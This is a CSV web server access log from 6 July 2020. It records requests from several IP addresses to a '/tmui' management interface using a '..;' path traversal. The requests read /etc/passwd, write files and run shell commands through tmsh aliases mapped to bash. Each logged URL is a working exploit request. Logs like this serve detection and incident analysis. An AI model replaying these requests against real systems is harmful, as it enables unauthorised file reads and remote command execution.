Timestamp,Remote IP,HTTP Method,URL,User-Agent,Response Code
"Jul 6, 2020 @ 09:20:40.000",95.214.11.231,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:20:33.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cepi,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:20:30.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cepi&content=id,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:20:30.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cepi,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:20:29.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:20:29.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:20:28.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cepi&content=id,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:20:27.000",95.215.108.217,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:20:27.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:20:25.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:20:24.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:20:22.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:20:13.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cepi,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:20:11.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cepi&content=id,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:20:08.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:20:04.000",103.224.82.85,GET,//tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:18:19.000",71.6.142.85,GET,/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",200
"Jul 6, 2020 @ 09:18:03.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:18:03.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:18:01.000",95.214.11.231,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:17:51.000",212.8.247.179,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:17:50.000",95.215.108.217,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:17:50.000",156.204.67.207,GET,/tmui/login.jsp,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:17:49.000",156.204.67.207,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:17:48.000",95.214.11.231,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:17:09.000",156.204.67.207,GET,/tmui/login.jsp,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:17:09.000",217.182.38.134,GET,/tmui/login.jsp,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:17:08.000",156.204.67.207,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.22.0,200
"Jul 6, 2020 @ 09:17:07.000",217.182.38.134,GET,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd,python-requests/2.24.0,200
"Jul 6, 2020 @ 09:15:42.000",71.6.142.85,GET,/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",200
"Jul 6, 2020 @ 09:14:36.000",95.215.108.217,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:14:32.000",95.214.11.231,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
"Jul 6, 2020 @ 09:14:31.000",95.214.11.231,POST,/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",200
